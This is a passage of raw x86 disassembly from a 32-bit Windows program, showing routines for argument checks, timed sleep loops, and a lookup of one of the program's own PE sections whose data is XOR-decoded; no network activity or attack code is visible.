  402bb1:	e9 45 f6 ff ff       	jmp    0x4021fb
  402bb6:	68 90 e5 41 00       	push   $0x41e590
  402bbb:	e8 f0 0a 00 00       	call   0x4036b0
  402bc0:	83 c4 04             	add    $0x4,%esp
  402bc3:	53                   	push   %ebx
  402bc4:	ff 15 38 e0 41 00    	call   *0x41e038
  402bca:	e9 2c f6 ff ff       	jmp    0x4021fb
  402bcf:	56                   	push   %esi
  402bd0:	68 f8 e5 41 00       	push   $0x41e5f8
  402bd5:	e8 d6 0a 00 00       	call   0x4036b0
  402bda:	83 c4 08             	add    $0x8,%esp
  402bdd:	53                   	push   %ebx
  402bde:	ff 15 38 e0 41 00    	call   *0x41e038
  402be4:	e9 12 f6 ff ff       	jmp    0x4021fb
  402be9:	cc                   	int3
  402bea:	cc                   	int3
  402beb:	cc                   	int3
  402bec:	cc                   	int3
  402bed:	cc                   	int3
  402bee:	cc                   	int3
  402bef:	cc                   	int3
  402bf0:	8b 44 24 08          	mov    0x8(%esp),%eax
  402bf4:	8d 0c 85 00 00 00 00 	lea    0x0(,%eax,4),%ecx
  402bfb:	8b 44 24 04          	mov    0x4(%esp),%eax
  402bff:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402c05:	72 12                	jb     0x402c19
  402c07:	8b 50 fc             	mov    -0x4(%eax),%edx
  402c0a:	83 c1 23             	add    $0x23,%ecx
  402c0d:	2b c2                	sub    %edx,%eax
  402c0f:	83 c0 fc             	add    $0xfffffffc,%eax
  402c12:	83 f8 1f             	cmp    $0x1f,%eax
  402c15:	77 0f                	ja     0x402c26
  402c17:	8b c2                	mov    %edx,%eax
  402c19:	51                   	push   %ecx
  402c1a:	50                   	push   %eax
  402c1b:	e8 8b 78 00 00       	call   0x40a4ab
  402c20:	83 c4 08             	add    $0x8,%esp
  402c23:	c2 08 00             	ret    $0x8
  402c26:	6a 00                	push   $0x0
  402c28:	6a 00                	push   $0x0
  402c2a:	6a 00                	push   $0x0
  402c2c:	6a 00                	push   $0x0
  402c2e:	6a 00                	push   $0x0
  402c30:	e8 3a b1 00 00       	call   0x40dd6f
  402c35:	cc                   	int3
  402c36:	cc                   	int3
  402c37:	cc                   	int3
  402c38:	cc                   	int3
  402c39:	cc                   	int3
  402c3a:	cc                   	int3
  402c3b:	cc                   	int3
  402c3c:	cc                   	int3
  402c3d:	cc                   	int3
  402c3e:	cc                   	int3
  402c3f:	cc                   	int3
  402c40:	56                   	push   %esi
  402c41:	8b f1                	mov    %ecx,%esi
  402c43:	56                   	push   %esi
  402c44:	e8 ba 6d 00 00       	call   0x409a03
  402c49:	83 c4 04             	add    $0x4,%esp
  402c4c:	85 c0                	test   %eax,%eax
  402c4e:	75 0b                	jne    0x402c5b
  402c50:	81 7e 2c ff ff ff 7f 	cmpl   $0x7fffffff,0x2c(%esi)
  402c57:	74 09                	je     0x402c62
  402c59:	5e                   	pop    %esi
  402c5a:	c3                   	ret
  402c5b:	6a 05                	push   $0x5
  402c5d:	e8 df 75 00 00       	call   0x40a241
  402c62:	6a 06                	push   $0x6
  402c64:	c7 46 2c fe ff ff 7f 	movl   $0x7ffffffe,0x2c(%esi)
  402c6b:	e8 d1 75 00 00       	call   0x40a241
  402c70:	cc                   	int3
  402c71:	cc                   	int3
  402c72:	cc                   	int3
  402c73:	cc                   	int3
  402c74:	cc                   	int3
  402c75:	cc                   	int3
  402c76:	cc                   	int3
  402c77:	cc                   	int3
  402c78:	cc                   	int3
  402c79:	cc                   	int3
  402c7a:	cc                   	int3
  402c7b:	cc                   	int3
  402c7c:	cc                   	int3
  402c7d:	cc                   	int3
  402c7e:	cc                   	int3
  402c7f:	cc                   	int3
  402c80:	83 ec 0c             	sub    $0xc,%esp
  402c83:	53                   	push   %ebx
  402c84:	55                   	push   %ebp
  402c85:	56                   	push   %esi
  402c86:	57                   	push   %edi
  402c87:	e8 4f 6c 00 00       	call   0x4098db
  402c8c:	8b e8                	mov    %eax,%ebp
  402c8e:	8b da                	mov    %edx,%ebx
  402c90:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  402c94:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  402c98:	e8 27 6c 00 00       	call   0x4098c4
  402c9d:	8b f0                	mov    %eax,%esi
  402c9f:	8b fa                	mov    %edx,%edi
  402ca1:	81 fd 80 96 98 00    	cmp    $0x989680,%ebp
  402ca7:	75 21                	jne    0x402cca
  402ca9:	85 db                	test   %ebx,%ebx
  402cab:	75 1d                	jne    0x402cca
  402cad:	53                   	push   %ebx
  402cae:	6a 64                	push   $0x64
  402cb0:	57                   	push   %edi
  402cb1:	56                   	push   %esi
  402cb2:	e8 b9 7b 00 00       	call   0x40a870
  402cb7:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  402cbb:	5f                   	pop    %edi
  402cbc:	5e                   	pop    %esi
  402cbd:	5d                   	pop    %ebp
  402cbe:	89 01                	mov    %eax,(%ecx)
  402cc0:	8b c1                	mov    %ecx,%eax
  402cc2:	89 51 04             	mov    %edx,0x4(%ecx)
  402cc5:	5b                   	pop    %ebx
  402cc6:	83 c4 0c             	add    $0xc,%esp
  402cc9:	c3                   	ret
  402cca:	81 fd 00 36 6e 01    	cmp    $0x16e3600,%ebp
  402cd0:	75 4a                	jne    0x402d1c
  402cd2:	85 db                	test   %ebx,%ebx
  402cd4:	75 46                	jne    0x402d1c
  402cd6:	53                   	push   %ebx
  402cd7:	55                   	push   %ebp
  402cd8:	57                   	push   %edi
  402cd9:	56                   	push   %esi
  402cda:	e8 01 7a 00 00       	call   0x40a6e0
  402cdf:	6a 00                	push   $0x0
  402ce1:	68 00 36 6e 01       	push   $0x16e3600
  402ce6:	8b da                	mov    %edx,%ebx
  402ce8:	8b e8                	mov    %eax,%ebp
  402cea:	53                   	push   %ebx
  402ceb:	55                   	push   %ebp
  402cec:	e8 7f 7b 00 00       	call   0x40a870
  402cf1:	2b f0                	sub    %eax,%esi
  402cf3:	6a 00                	push   $0x0
  402cf5:	68 00 ca 9a 3b       	push   $0x3b9aca00
  402cfa:	1b fa                	sbb    %edx,%edi
  402cfc:	57                   	push   %edi
  402cfd:	56                   	push   %esi
  402cfe:	e8 6d 7b 00 00       	call   0x40a870
  402d03:	6a 00                	push   $0x0
  402d05:	68 00 36 6e 01       	push   $0x16e3600
  402d0a:	52                   	push   %edx
  402d0b:	50                   	push   %eax
  402d0c:	e8 cf 79 00 00       	call   0x40a6e0
  402d11:	6a 00                	push   $0x0
  402d13:	68 00 ca 9a 3b       	push   $0x3b9aca00
  402d18:	53                   	push   %ebx
  402d19:	55                   	push   %ebp
  402d1a:	eb 38                	jmp    0x402d54
  402d1c:	53                   	push   %ebx
  402d1d:	55                   	push   %ebp
  402d1e:	57                   	push   %edi
  402d1f:	56                   	push   %esi
  402d20:	e8 6b 7a 00 00       	call   0x40a790
  402d25:	6a 00                	push   $0x0
  402d27:	68 00 ca 9a 3b       	push   $0x3b9aca00
  402d2c:	53                   	push   %ebx
  402d2d:	51                   	push   %ecx
  402d2e:	89 44 24 28          	mov    %eax,0x28(%esp)
  402d32:	8b ea                	mov    %edx,%ebp
  402d34:	e8 37 7b 00 00       	call   0x40a870
  402d39:	ff 74 24 10          	push   0x10(%esp)
  402d3d:	ff 74 24 18          	push   0x18(%esp)
  402d41:	52                   	push   %edx
  402d42:	50                   	push   %eax
  402d43:	e8 98 79 00 00       	call   0x40a6e0
  402d48:	6a 00                	push   $0x0
  402d4a:	68 00 ca 9a 3b       	push   $0x3b9aca00
  402d4f:	55                   	push   %ebp
  402d50:	ff 74 24 24          	push   0x24(%esp)
  402d54:	8b fa                	mov    %edx,%edi
  402d56:	8b f0                	mov    %eax,%esi
  402d58:	e8 13 7b 00 00       	call   0x40a870
  402d5d:	03 f0                	add    %eax,%esi
  402d5f:	8b 44 24 20          	mov    0x20(%esp),%eax
  402d63:	13 fa                	adc    %edx,%edi
  402d65:	89 78 04             	mov    %edi,0x4(%eax)
  402d68:	5f                   	pop    %edi
  402d69:	89 30                	mov    %esi,(%eax)
  402d6b:	5e                   	pop    %esi
  402d6c:	5d                   	pop    %ebp
  402d6d:	5b                   	pop    %ebx
  402d6e:	83 c4 0c             	add    $0xc,%esp
  402d71:	c3                   	ret
  402d72:	cc                   	int3
  402d73:	cc                   	int3
  402d74:	cc                   	int3
  402d75:	cc                   	int3
  402d76:	cc                   	int3
  402d77:	cc                   	int3
  402d78:	cc                   	int3
  402d79:	cc                   	int3
  402d7a:	cc                   	int3
  402d7b:	cc                   	int3
  402d7c:	cc                   	int3
  402d7d:	cc                   	int3
  402d7e:	cc                   	int3
  402d7f:	cc                   	int3
  402d80:	68 ac e7 41 00       	push   $0x41e7ac
  402d85:	e8 26 09 00 00       	call   0x4036b0
  402d8a:	68 f0 e7 41 00       	push   $0x41e7f0
  402d8f:	e8 1c 09 00 00       	call   0x4036b0
  402d94:	68 60 e8 41 00       	push   $0x41e860
  402d99:	e8 12 09 00 00       	call   0x4036b0
  402d9e:	68 c8 e8 41 00       	push   $0x41e8c8
  402da3:	e8 08 09 00 00       	call   0x4036b0
  402da8:	68 00 e9 41 00       	push   $0x41e900
  402dad:	e8 fe 08 00 00       	call   0x4036b0
  402db2:	68 18 e9 41 00       	push   $0x41e918
  402db7:	e8 f4 08 00 00       	call   0x4036b0
  402dbc:	68 88 e9 41 00       	push   $0x41e988
  402dc1:	e8 ea 08 00 00       	call   0x4036b0
  402dc6:	68 20 ea 41 00       	push   $0x41ea20
  402dcb:	e8 e0 08 00 00       	call   0x4036b0
  402dd0:	68 80 ea 41 00       	push   $0x41ea80
  402dd5:	e8 d6 08 00 00       	call   0x4036b0
  402dda:	68 f0 ea 41 00       	push   $0x41eaf0
  402ddf:	e8 cc 08 00 00       	call   0x4036b0
  402de4:	83 c4 28             	add    $0x28,%esp
  402de7:	c3                   	ret
  402de8:	cc                   	int3
  402de9:	cc                   	int3
  402dea:	cc                   	int3
  402deb:	cc                   	int3
  402dec:	cc                   	int3
  402ded:	cc                   	int3
  402dee:	cc                   	int3
  402def:	cc                   	int3
  402df0:	83 ec 20             	sub    $0x20,%esp
  402df3:	53                   	push   %ebx
  402df4:	55                   	push   %ebp
  402df5:	8b e9                	mov    %ecx,%ebp
  402df7:	56                   	push   %esi
  402df8:	57                   	push   %edi
  402df9:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  402dfd:	8d 5d 20             	lea    0x20(%ebp),%ebx
  402e00:	53                   	push   %ebx
  402e01:	e8 fd 6b 00 00       	call   0x409a03
  402e06:	83 c4 04             	add    $0x4,%esp
  402e09:	85 c0                	test   %eax,%eax
  402e0b:	0f 85 cd 01 00 00    	jne    0x402fde
  402e11:	8b 43 2c             	mov    0x2c(%ebx),%eax
  402e14:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  402e19:	0f 84 b4 01 00 00    	je     0x402fd3
  402e1f:	83 7d 1c 00          	cmpl   $0x0,0x1c(%ebp)
  402e23:	53                   	push   %ebx
  402e24:	0f 84 99 01 00 00    	je     0x402fc3
  402e2a:	e8 e5 6b 00 00       	call   0x409a14
  402e2f:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  402e33:	50                   	push   %eax
  402e34:	e8 47 fe ff ff       	call   0x402c80
  402e39:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  402e3d:	83 c4 08             	add    $0x8,%esp
  402e40:	81 f9 ff ff ff 7f    	cmp    $0x7fffffff,%ecx
  402e46:	7f 1f                	jg     0x402e67
  402e48:	8b 44 24 28          	mov    0x28(%esp),%eax
  402e4c:	7c 07                	jl     0x402e55
  402e4e:	3d ff 1e 0a fa       	cmp    $0xfa0a1eff,%eax
  402e53:	73 12                	jae    0x402e67
  402e55:	05 00 e1 f5 05       	add    $0x5f5e100,%eax
  402e5a:	89 44 24 10          	mov    %eax,0x10(%esp)
  402e5e:	83 d1 00             	adc    $0x0,%ecx
  402e61:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  402e65:	eb 10                	jmp    0x402e77
  402e67:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  402e6e:	ff 
  402e6f:	c7 44 24 14 ff ff ff 	movl   $0x7fffffff,0x14(%esp)
  402e76:	7f 
  402e77:	e8 5f 6a 00 00       	call   0x4098db
  402e7c:	8b f8                	mov    %eax,%edi
  402e7e:	8b f2                	mov    %edx,%esi
  402e80:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  402e84:	89 74 24 18          	mov    %esi,0x18(%esp)
  402e88:	e8 37 6a 00 00       	call   0x4098c4
  402e8d:	8b d8                	mov    %eax,%ebx
  402e8f:	8b ea                	mov    %edx,%ebp
  402e91:	81 ff 80 96 98 00    	cmp    $0x989680,%edi
  402e97:	75 1c                	jne    0x402eb5
  402e99:	85 f6                	test   %esi,%esi
  402e9b:	75 18                	jne    0x402eb5
  402e9d:	be 64 00 00 00       	mov    $0x64,%esi
  402ea2:	8b c5                	mov    %ebp,%eax
  402ea4:	f7 e6                	mul    %esi
  402ea6:	8b c8                	mov    %eax,%ecx
  402ea8:	8b c3                	mov    %ebx,%eax
  402eaa:	f7 e6                	mul    %esi
  402eac:	03 ca                	add    %edx,%ecx
  402eae:	8b d8                	mov    %eax,%ebx
  402eb0:	e9 85 00 00 00       	jmp    0x402f3a
  402eb5:	81 ff 00 36 6e 01    	cmp    $0x16e3600,%edi
  402ebb:	75 3a                	jne    0x402ef7
  402ebd:	85 f6                	test   %esi,%esi
  402ebf:	75 36                	jne    0x402ef7
  402ec1:	56                   	push   %esi
  402ec2:	57                   	push   %edi
  402ec3:	55                   	push   %ebp
  402ec4:	53                   	push   %ebx
  402ec5:	e8 16 78 00 00       	call   0x40a6e0
  402eca:	6a 00                	push   $0x0
  402ecc:	68 00 36 6e 01       	push   $0x16e3600
  402ed1:	8b f2                	mov    %edx,%esi
  402ed3:	8b f8                	mov    %eax,%edi
  402ed5:	56                   	push   %esi
  402ed6:	57                   	push   %edi
  402ed7:	e8 94 79 00 00       	call   0x40a870
  402edc:	2b d8                	sub    %eax,%ebx
  402ede:	6a 00                	push   $0x0
  402ee0:	68 00 ca 9a 3b       	push   $0x3b9aca00
  402ee5:	1b ea                	sbb    %edx,%ebp
  402ee7:	55                   	push   %ebp
  402ee8:	53                   	push   %ebx
  402ee9:	e8 82 79 00 00       	call   0x40a870
  402eee:	6a 00                	push   $0x0
  402ef0:	68 00 36 6e 01       	push   $0x16e3600
  402ef5:	eb 23                	jmp    0x402f1a
  402ef7:	56                   	push   %esi
  402ef8:	57                   	push   %edi
  402ef9:	55                   	push   %ebp
  402efa:	53                   	push   %ebx
  402efb:	e8 90 78 00 00       	call   0x40a790
  402f00:	6a 00                	push   $0x0
  402f02:	68 00 ca 9a 3b       	push   $0x3b9aca00
  402f07:	53                   	push   %ebx
  402f08:	51                   	push   %ecx
  402f09:	8b f8                	mov    %eax,%edi
  402f0b:	8b f2                	mov    %edx,%esi
  402f0d:	e8 5e 79 00 00       	call   0x40a870
  402f12:	ff 74 24 18          	push   0x18(%esp)
  402f16:	ff 74 24 20          	push   0x20(%esp)
  402f1a:	52                   	push   %edx
  402f1b:	50                   	push   %eax
  402f1c:	e8 bf 77 00 00       	call   0x40a6e0
  402f21:	8b d8                	mov    %eax,%ebx
  402f23:	8b ca                	mov    %edx,%ecx
  402f25:	8b c6                	mov    %esi,%eax
  402f27:	bd 00 ca 9a 3b       	mov    $0x3b9aca00,%ebp
  402f2c:	f7 e5                	mul    %ebp
  402f2e:	8b f0                	mov    %eax,%esi
  402f30:	8b c7                	mov    %edi,%eax
  402f32:	f7 e5                	mul    %ebp
  402f34:	03 f2                	add    %edx,%esi
  402f36:	03 d8                	add    %eax,%ebx
  402f38:	13 ce                	adc    %esi,%ecx
  402f3a:	8b 54 24 14          	mov    0x14(%esp),%edx
  402f3e:	3b ca                	cmp    %edx,%ecx
  402f40:	7f 68                	jg     0x402faa
  402f42:	8b 44 24 10          	mov    0x10(%esp),%eax
  402f46:	7c 04                	jl     0x402f4c
  402f48:	3b d8                	cmp    %eax,%ebx
  402f4a:	73 5e                	jae    0x402faa
  402f4c:	8b f0                	mov    %eax,%esi
  402f4e:	2b f3                	sub    %ebx,%esi
  402f50:	8b da                	mov    %edx,%ebx
  402f52:	1b d9                	sbb    %ecx,%ebx
  402f54:	81 fb 94 4e 00 00    	cmp    $0x4e94,%ebx
  402f5a:	7c 1a                	jl     0x402f76
  402f5c:	7f 08                	jg     0x402f66
  402f5e:	81 fe 00 00 4f 91    	cmp    $0x914f0000,%esi
  402f64:	76 10                	jbe    0x402f76
  402f66:	bf 00 5c 26 05       	mov    $0x5265c00,%edi
  402f6b:	57                   	push   %edi
  402f6c:	e8 8c 6a 00 00       	call   0x4099fd
  402f71:	e9 01 ff ff ff       	jmp    0x402e77
  402f76:	6a 00                	push   $0x0
  402f78:	68 40 42 0f 00       	push   $0xf4240
  402f7d:	53                   	push   %ebx
  402f7e:	56                   	push   %esi
  402f7f:	e8 5c 77 00 00       	call   0x40a6e0
  402f84:	6a 00                	push   $0x0
  402f86:	68 40 42 0f 00       	push   $0xf4240
  402f8b:	8b f8                	mov    %eax,%edi
  402f8d:	52                   	push   %edx
  402f8e:	57                   	push   %edi
  402f8f:	e8 dc 78 00 00       	call   0x40a870
  402f94:	3b d3                	cmp    %ebx,%edx
  402f96:	7f 07                	jg     0x402f9f
  402f98:	7c 04                	jl     0x402f9e
  402f9a:	3b c6                	cmp    %esi,%eax
  402f9c:	73 01                	jae    0x402f9f
  402f9e:	47                   	inc    %edi
  402f9f:	57                   	push   %edi
  402fa0:	e8 58 6a 00 00       	call   0x4099fd
  402fa5:	e9 cd fe ff ff       	jmp    0x402e77
  402faa:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  402fae:	8d 5d 20             	lea    0x20(%ebp),%ebx
  402fb1:	53                   	push   %ebx
  402fb2:	e8 4c 6a 00 00       	call   0x409a03
  402fb7:	83 c4 04             	add    $0x4,%esp
  402fba:	85 c0                	test   %eax,%eax
  402fbc:	75 20                	jne    0x402fde
  402fbe:	e9 4e fe ff ff       	jmp    0x402e11
  402fc3:	e8 4c 6a 00 00       	call   0x409a14
  402fc8:	83 c4 04             	add    $0x4,%esp
  402fcb:	5f                   	pop    %edi
  402fcc:	5e                   	pop    %esi
  402fcd:	5d                   	pop    %ebp
  402fce:	5b                   	pop    %ebx
  402fcf:	83 c4 20             	add    $0x20,%esp
  402fd2:	c3                   	ret
  402fd3:	48                   	dec    %eax
  402fd4:	6a 06                	push   $0x6
  402fd6:	89 43 2c             	mov    %eax,0x2c(%ebx)
  402fd9:	e8 63 72 00 00       	call   0x40a241
  402fde:	6a 05                	push   $0x5
  402fe0:	e8 5c 72 00 00       	call   0x40a241
  402fe5:	cc                   	int3
  402fe6:	cc                   	int3
  402fe7:	cc                   	int3
  402fe8:	cc                   	int3
  402fe9:	cc                   	int3
  402fea:	cc                   	int3
  402feb:	cc                   	int3
  402fec:	cc                   	int3
  402fed:	cc                   	int3
  402fee:	cc                   	int3
  402fef:	cc                   	int3
  402ff0:	8b 49 04             	mov    0x4(%ecx),%ecx
  402ff3:	b8 08 e3 41 00       	mov    $0x41e308,%eax
  402ff8:	85 c9                	test   %ecx,%ecx
  402ffa:	0f 45 c1             	cmovne %ecx,%eax
  402ffd:	c3                   	ret
  402ffe:	cc                   	int3
  402fff:	cc                   	int3
  403000:	b8 58 8d 42 00       	mov    $0x428d58,%eax
  403005:	c3                   	ret
  403006:	cc                   	int3
  403007:	cc                   	int3
  403008:	cc                   	int3
  403009:	cc                   	int3
  40300a:	cc                   	int3
  40300b:	cc                   	int3
  40300c:	cc                   	int3
  40300d:	cc                   	int3
  40300e:	cc                   	int3
  40300f:	cc                   	int3
  403010:	55                   	push   %ebp
  403011:	8b ec                	mov    %esp,%ebp
  403013:	6a ff                	push   $0xffffffff
  403015:	68 f6 db 41 00       	push   $0x41dbf6
  40301a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403020:	50                   	push   %eax
  403021:	81 ec ac 05 00 00    	sub    $0x5ac,%esp
  403027:	a1 80 80 42 00       	mov    0x428080,%eax
  40302c:	33 c5                	xor    %ebp,%eax
  40302e:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403031:	56                   	push   %esi
  403032:	57                   	push   %edi
  403033:	50                   	push   %eax
  403034:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403037:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40303d:	8b 7d 08             	mov    0x8(%ebp),%edi
  403040:	33 c0                	xor    %eax,%eax
  403042:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403045:	89 8d 78 fb ff ff    	mov    %ecx,-0x488(%ebp)
  40304b:	c6 85 7f fb ff ff 01 	movb   $0x1,-0x481(%ebp)
  403052:	8d 70 01             	lea    0x1(%eax),%esi
  403055:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  40305b:	3b fe                	cmp    %esi,%edi
  40305d:	7e 7b                	jle    0x4030da
  40305f:	90                   	nop
  403060:	8d 04 b5 00 00 00 00 	lea    0x0(,%esi,4),%eax
  403067:	68 44 eb 41 00       	push   $0x41eb44
  40306c:	ff 34 08             	push   (%eax,%ecx,1)
  40306f:	89 85 74 fb ff ff    	mov    %eax,-0x48c(%ebp)
  403075:	ff 15 48 e0 41 00    	call   *0x41e048
  40307b:	85 c0                	test   %eax,%eax
  40307d:	75 27                	jne    0x4030a6
  40307f:	46                   	inc    %esi
  403080:	88 85 7f fb ff ff    	mov    %al,-0x481(%ebp)
  403086:	3b f7                	cmp    %edi,%esi
  403088:	0f 8d ce 00 00 00    	jge    0x40315c
  40308e:	8b 85 74 fb ff ff    	mov    -0x48c(%ebp),%eax
  403094:	8b 8d 78 fb ff ff    	mov    -0x488(%ebp),%ecx
  40309a:	8b 44 08 04          	mov    0x4(%eax,%ecx,1),%eax
  40309e:	89 85 68 fb ff ff    	mov    %eax,-0x498(%ebp)
  4030a4:	eb 2f                	jmp    0x4030d5
  4030a6:	8b 85 74 fb ff ff    	mov    -0x48c(%ebp),%eax
  4030ac:	8b 8d 78 fb ff ff    	mov    -0x488(%ebp),%ecx
  4030b2:	68 9c eb 41 00       	push   $0x41eb9c
  4030b7:	ff 34 08             	push   (%eax,%ecx,1)
  4030ba:	ff 15 48 e0 41 00    	call   *0x41e048
  4030c0:	85 c0                	test   %eax,%eax
  4030c2:	0f 85 ab 00 00 00    	jne    0x403173
  4030c8:	8b 8d 78 fb ff ff    	mov    -0x488(%ebp),%ecx
  4030ce:	c6 85 7f fb ff ff 01 	movb   $0x1,-0x481(%ebp)
  4030d5:	46                   	inc    %esi
  4030d6:	3b f7                	cmp    %edi,%esi
  4030d8:	7c 86                	jl     0x403060
  4030da:	68 e4 eb 41 00       	push   $0x41ebe4
  4030df:	e8 cc 05 00 00       	call   0x4036b0
  4030e4:	83 c4 04             	add    $0x4,%esp
  4030e7:	e8 d4 65 00 00       	call   0x4096c0
  4030ec:	6a 00                	push   $0x0
  4030ee:	ff 15 44 e0 41 00    	call   *0x41e044
  4030f4:	89 85 70 fb ff ff    	mov    %eax,-0x490(%ebp)
  4030fa:	33 ff                	xor    %edi,%edi
  4030fc:	8b 50 3c             	mov    0x3c(%eax),%edx
  4030ff:	03 d0                	add    %eax,%edx
  403101:	0f b7 4a 14          	movzwl 0x14(%edx),%ecx
  403105:	0f b7 42 06          	movzwl 0x6(%edx),%eax
  403109:	03 ca                	add    %edx,%ecx
  40310b:	33 d2                	xor    %edx,%edx
  40310d:	89 8d 74 fb ff ff    	mov    %ecx,-0x48c(%ebp)
  403113:	89 85 78 fb ff ff    	mov    %eax,-0x488(%ebp)
  403119:	66 3b d0             	cmp    %ax,%dx
  40311c:	0f 83 ea 00 00 00    	jae    0x40320c
  403122:	0f b7 c7             	movzwl %di,%eax
  403125:	83 c1 18             	add    $0x18,%ecx
  403128:	ba 18 ec 41 00       	mov    $0x41ec18,%edx
  40312d:	be 04 00 00 00       	mov    $0x4,%esi
  403132:	8d 04 80             	lea    (%eax,%eax,4),%eax
  403135:	c1 e0 03             	shl    $0x3,%eax
  403138:	89 85 6c fb ff ff    	mov    %eax,-0x494(%ebp)
  40313e:	03 c8                	add    %eax,%ecx
  403140:	8b 01                	mov    (%ecx),%eax
  403142:	3b 02                	cmp    (%edx),%eax
  403144:	0f 85 83 00 00 00    	jne    0x4031cd
  40314a:	83 c1 04             	add    $0x4,%ecx
  40314d:	83 c2 04             	add    $0x4,%edx
  403150:	83 ee 04             	sub    $0x4,%esi
  403153:	73 eb                	jae    0x403140
  403155:	33 c0                	xor    %eax,%eax
  403157:	e9 98 00 00 00       	jmp    0x4031f4
  40315c:	68 50 eb 41 00       	push   $0x41eb50
  403161:	e8 4a 05 00 00       	call   0x4036b0
  403166:	83 c4 04             	add    $0x4,%esp
  403169:	e8 12 fc ff ff       	call   0x402d80
  40316e:	e9 a6 00 00 00       	jmp    0x403219
  403173:	8b 85 78 fb ff ff    	mov    -0x488(%ebp),%eax
  403179:	8b b5 74 fb ff ff    	mov    -0x48c(%ebp),%esi
  40317f:	8b 3d 48 e0 41 00    	mov    0x41e048,%edi
  403185:	68 a8 eb 41 00       	push   $0x41eba8
  40318a:	ff 34 06             	push   (%esi,%eax,1)
  40318d:	ff d7                	call   *%edi
  40318f:	85 c0                	test   %eax,%eax
  403191:	74 31                	je     0x4031c4
  403193:	8b 85 78 fb ff ff    	mov    -0x488(%ebp),%eax
  403199:	68 b4 eb 41 00       	push   $0x41ebb4
  40319e:	ff 34 06             	push   (%esi,%eax,1)
  4031a1:	ff d7                	call   *%edi
  4031a3:	85 c0                	test   %eax,%eax
  4031a5:	74 1d                	je     0x4031c4
  4031a7:	8b 85 78 fb ff ff    	mov    -0x488(%ebp),%eax
  4031ad:	ff 34 06             	push   (%esi,%eax,1)
  4031b0:	68 bc eb 41 00       	push   $0x41ebbc
  4031b5:	e8 f6 04 00 00       	call   0x4036b0
  4031ba:	83 c4 08             	add    $0x8,%esp
  4031bd:	e8 be fb ff ff       	call   0x402d80
  4031c2:	eb 55                	jmp    0x403219
  4031c4:	e8 b7 fb ff ff       	call   0x402d80
  4031c9:	33 c0                	xor    %eax,%eax
  4031cb:	eb 51                	jmp    0x40321e
  4031cd:	8a 01                	mov    (%ecx),%al
  4031cf:	3a 02                	cmp    (%edx),%al
  4031d1:	75 1c                	jne    0x4031ef
  4031d3:	8a 41 01             	mov    0x1(%ecx),%al
  4031d6:	3a 42 01             	cmp    0x1(%edx),%al
  4031d9:	75 14                	jne    0x4031ef
  4031db:	8a 41 02             	mov    0x2(%ecx),%al
  4031de:	3a 42 02             	cmp    0x2(%edx),%al
  4031e1:	75 0c                	jne    0x4031ef
  4031e3:	8a 41 03             	mov    0x3(%ecx),%al
  4031e6:	3a 42 03             	cmp    0x3(%edx),%al
  4031e9:	75 04                	jne    0x4031ef
  4031eb:	33 c0                	xor    %eax,%eax
  4031ed:	eb 05                	jmp    0x4031f4
  4031ef:	1b c0                	sbb    %eax,%eax
  4031f1:	83 c8 01             	or     $0x1,%eax
  4031f4:	8b 8d 74 fb ff ff    	mov    -0x48c(%ebp),%ecx
  4031fa:	85 c0                	test   %eax,%eax
  4031fc:	74 3b                	je     0x403239
  4031fe:	47                   	inc    %edi
  4031ff:	66 3b bd 78 fb ff ff 	cmp    -0x488(%ebp),%di
  403206:	0f 82 16 ff ff ff    	jb     0x403122
  40320c:	68 20 ec 41 00       	push   $0x41ec20
  403211:	e8 9a 04 00 00       	call   0x4036b0
  403216:	83 c4 04             	add    $0x4,%esp
  403219:	b8 01 00 00 00       	mov    $0x1,%eax
  40321e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403221:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403228:	59                   	pop    %ecx
  403229:	5f                   	pop    %edi
  40322a:	5e                   	pop    %esi
  40322b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40322e:	33 cd                	xor    %ebp,%ecx
  403230:	e8 92 74 00 00       	call   0x40a6c7
  403235:	8b e5                	mov    %ebp,%esp
  403237:	5d                   	pop    %ebp
  403238:	c3                   	ret
  403239:	8b 85 6c fb ff ff    	mov    -0x494(%ebp),%eax
  40323f:	8b 44 01 24          	mov    0x24(%ecx,%eax,1),%eax
  403243:	03 85 70 fb ff ff    	add    -0x490(%ebp),%eax
  403249:	33 d2                	xor    %edx,%edx
  40324b:	0f 10 00             	movups (%eax),%xmm0
  40324e:	0f 11 85 80 fb ff ff 	movups %xmm0,-0x480(%ebp)
  403255:	0f 10 40 10          	movups 0x10(%eax),%xmm0
  403259:	0f 11 85 90 fb ff ff 	movups %xmm0,-0x470(%ebp)
  403260:	0f 10 40 20          	movups 0x20(%eax),%xmm0
  403264:	b8 7d fc d8 52       	mov    $0x52d8fc7d,%eax
  403269:	8b c8                	mov    %eax,%ecx
  40326b:	8b f0                	mov    %eax,%esi
  40326d:	0f 11 85 a0 fb ff ff 	movups %xmm0,-0x460(%ebp)
  403274:	31 84 95 80 fb ff ff 	xor    %eax,-0x480(%ebp,%edx,4)
  40327b:	42                   	inc    %edx
  40327c:	c1 e9 13             	shr    $0x13,%ecx
  40327f:	c1 e6 0d             	shl    $0xd,%esi
  403282:	0b ce                	or     %esi,%ecx
  403284:	69 c1 6d 7c 8b 9a    	imul   $0x9a8b7c6d,%ecx,%eax
  40328a:	35 2c 3d 4f 5e       	xor    $0x5e4f3d2c,%eax
  40328f:	8b c8                	mov    %eax,%ecx
  403291:	8b f0                	mov    %eax,%esi
  403293:	83 fa 0c             	cmp    $0xc,%edx
  403296:	72 dc                	jb     0x403274
  403298:	0f 10 85 80 fb ff ff 	movups -0x480(%ebp),%xmm0
